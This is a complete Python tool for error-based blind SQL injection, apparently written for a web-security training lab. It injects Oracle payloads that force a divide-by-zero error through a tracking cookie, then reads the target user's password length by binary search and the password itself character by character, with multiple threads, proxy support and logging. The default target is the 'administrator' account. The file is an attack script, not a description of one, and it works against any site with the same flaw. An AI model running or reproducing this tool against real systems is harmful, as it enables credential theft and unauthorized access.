#!/usr/bin/env python3
import sys
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed

from colorama import Fore, Style

from common import (
    DEFAULT_HEADERS, setup_logger, banner, log_info, log_warn, log_error,
    build_charset, make_session, make_proxies, timestamp_log_name,
    prompt_url, prompt_tracking, prompt_cookie_name, prompt_session_cookie,
    prompt_users, prompt_length, prompt_proxy, prompt_workers,
    prompt_special, prompt_timeout
)


class ErrorSQLiEngine:
    def __init__(self, args):
        self.url = args.url
        self.base_id = args.tracking
        self.cookie_name = args.cookie
        self.session_cookie = args.session
        self.target_users = [u.strip() for u in args.users.split(',') if u.strip()]
        self.max_length = args.length
        self.use_special = args.special
        self.workers = max(1, args.workers)
        self.timeout = args.timeout
        self.log_file = args.log
        self.logger = setup_logger(self.log_file, "ErrorSQLi")
        self.headers = dict(DEFAULT_HEADERS)
        self.proxies = make_proxies(args.proxy)
        self.charset = build_charset(self.use_special)
        self.session = make_session()

    def _build_char_payload(self, user, position, char):
        return (
            f"{self.base_id}' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) "
            f"ELSE '' END from users where username='{user}' "
            f"and substring(password,{position},1)='{char}') || '"
        )

    def _build_length_payload(self, user, mid):
        return (
            f"{self.base_id}' || (select CASE WHEN (length(password) >= {mid}) "
            f"THEN TO_CHAR(1/0) ELSE '' END from users "
            f"where username='{user}') || '"
        )

    def _build_probe_payload(self):
        return f"{self.base_id}' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '"

    def _send_request(self, payload):
        cookies = {self.cookie_name: payload}
        if self.session_cookie:
            cookies["session"] = self.session_cookie
        try:
            r = self.session.get(
                self.url, cookies=cookies, headers=self.headers,
                proxies=self.proxies, verify=False, timeout=self.timeout,
                allow_redirects=False
            )
            return r.status_code == 500 or "Internal Server Error" in r.text
        except Exception as e:
            self.logger.debug(f"Request failed: {e}")
            return False

    def _probe(self):
        log_info("Probing Error-based injection (Oracle TO_CHAR(1/0))...")
        if self._send_request(self._build_probe_payload()):
            log_info("Error payload confirmed (HTTP 500 / Internal Server Error)")
            return True
        log_error("Error probe failed. Check URL/cookie/session.")
        return False

    def _detect_length(self, user):
        log_info(f"Detecting password length for '{user}' (binary search)...")
        low, high = 1, 128
        length = -1
        while low <= high:
            mid = (low + high) // 2
            if self._send_request(self._build_length_payload(user, mid)):
                length = mid
                low = mid + 1
            else:
                high = mid - 1
        if length == -1:
            log_error("Could not determine length.")
            return None
        log_info(f"Password length detected: {length}")
        return length

    def _extract_char(self, user, position):
        found = None
        with ThreadPoolExecutor(max_workers=self.workers) as ex:
            futs = {}
            for c in self.charset:
                futs[ex.submit(self._send_request, self._build_char_payload(user, position, c))] = c
            for fut in as_completed(futs):
                c = futs[fut]
                try:
                    if fut.result():
                        found = c
                        for f in futs:
                            if not f.done():
                                f.cancel()
                        break
                except Exception as e:
                    self.logger.debug(f"Future error: {e}")
        return found

    def extract_password(self, user):
        log_info(f"Starting extraction for user: {Fore.CYAN}{user}{Style.RESET_ALL}")
        if not self._probe():
            return None
        if self.max_length:
            length = self.max_length
            log_info(f"Using provided length: {length}")
        else:
            length = self._detect_length(user)
            if not length:
                return None
        password = ""
        for pos in range(1, length + 1):
            sys.stdout.write(f"\r[+] {user} | Pos {pos}/{length} | Current: {Fore.YELLOW}{password}{Style.RESET_ALL} ")
            sys.stdout.flush()
            c = self._extract_char(user, pos)
            if c:
                password += c
                self.logger.info(f"Position {pos}: Found '{c}'")
            else:
                log_warn(f"Character not found at position {pos}. Stopping.")
                break
        sys.stdout.write("\n")
        return password

    def run(self):
        results = {}
        for user in self.target_users:
            log_info(f"{'='*20} Target: {user} {'='*20}")
            pwd = self.extract_password(user)
            if pwd:
                results[user] = pwd
                log_info(f"Success! Password for {Fore.CYAN}{user}{Style.RESET_ALL} is: {Fore.GREEN}{pwd}{Style.RESET_ALL}")
            else:
                log_error(f"Failed to extract password for {user}.")
        self._summary(results)

    def _summary(self, results):
        print(f"\n{Fore.MAGENTA}{'='*40}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA} FINAL RESULTS — ERROR MODE {Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'='*40}{Style.RESET_ALL}")
        for u, p in results.items():
            print(f"{Fore.CYAN}{u:15} {Style.RESET_ALL} : {Fore.GREEN}{p}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'='*40}{Style.RESET_ALL}")
        print(f"\n[+] Results logged to: {self.log_file}")


def interactive():
    banner(subtitle="E R R O R   M O D E   ( H T T P   5 0 0 )")
    print(f"\n{Fore.YELLOW}[*] Interactive Mode — Error-based lab{Style.RESET_ALL}\n")
    args = argparse.Namespace()
    args.url = prompt_url()
    args.tracking = prompt_tracking()
    args.cookie = prompt_cookie_name()
    args.session = prompt_session_cookie()
    args.users = prompt_users()
    args.length = prompt_length()
    args.proxy = prompt_proxy()
    args.workers = prompt_workers(default=1)
    args.timeout = prompt_timeout()
    args.special = prompt_special()
    args.log = timestamp_log_name("error_sqli")
    return args


def build_parser():
    p = argparse.ArgumentParser(description="Error-based Blind SQLi (HTTP 500 lab)")
    p.add_argument("-u", "--url", required=True)
    p.add_argument("-t", "--tracking", default="182--")
    p.add_argument("-c", "--cookie", default="TrackingId")
    p.add_argument("-sc", "--session", default=None)
    p.add_argument("-usr", "--users", default="administrator")
    p.add_argument("-l", "--length", type=int, default=None)
    p.add_argument("-p", "--proxy", default=None)
    p.add_argument("-w", "--workers", type=int, default=1)
    p.add_argument("-T", "--timeout", type=int, default=15)
    p.add_argument("-s", "--special", action="store_true")
    p.add_argument("-o", "--log", default=timestamp_log_name("error_sqli"))
    return p


def main():
    if len(sys.argv) == 1:
        args = interactive()
    else:
        args = build_parser().parse_args()

    if not args.url.startswith(("http://", "https://")):
        log_error("URL must start with http:// or https://")
        sys.exit(1)

    engine = ErrorSQLiEngine(args)
    try:
        engine.run()
    except KeyboardInterrupt:
        log_warn("\n[!] Interrupted by user.")
        sys.exit(0)


if __name__ == "__main__":
    main()